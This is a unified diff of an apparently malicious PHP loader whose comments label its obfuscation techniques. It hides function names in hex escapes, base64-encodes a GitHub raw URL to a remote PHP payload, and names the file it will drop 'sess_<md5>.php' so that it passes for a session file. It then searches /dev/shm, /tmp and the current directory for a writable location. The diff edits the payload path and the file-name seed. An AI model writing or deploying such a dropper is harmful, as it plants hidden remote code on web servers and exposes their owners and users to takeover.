@@ -27,13 +27,13 @@ $i_w   = "\x69\x73\x5f\x77\x72\x69\x74\x61\x62\x6c\x65";
 // [Teknik 1] Base64 Encoding
 // URL Github Raw & Folder Path (disamarkan total)
 $u_part1 = base64_decode("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLw==");
-$u_part2 = base64_decode("YXFpbG9naWMvbG9naWMvcmVmcy9oZWFkcy9tYWluL3BybzMucGhw");
+$u_part2 = base64_decode("YXFpbG9naWMvbG9naWMvcmVmcy9oZWFkcy9tYWluL3BybzM=");
 $u_target = $u_part1 . $u_part2;
 
 // [Teknik 7] Callback Function
 // Mencari path writable menggunakan callback 'is_writable'
 $dirs = [base64_decode("L2Rldi9zaG0v"), base64_decode("L3RtcC8="), "./"];
-$name = 'sess_' . md5('mangsud') . '.php';
+$name = 'sess_' . md5('logic') . '.php';
 $final_file = "";
 
 foreach ($dirs as $dir) {
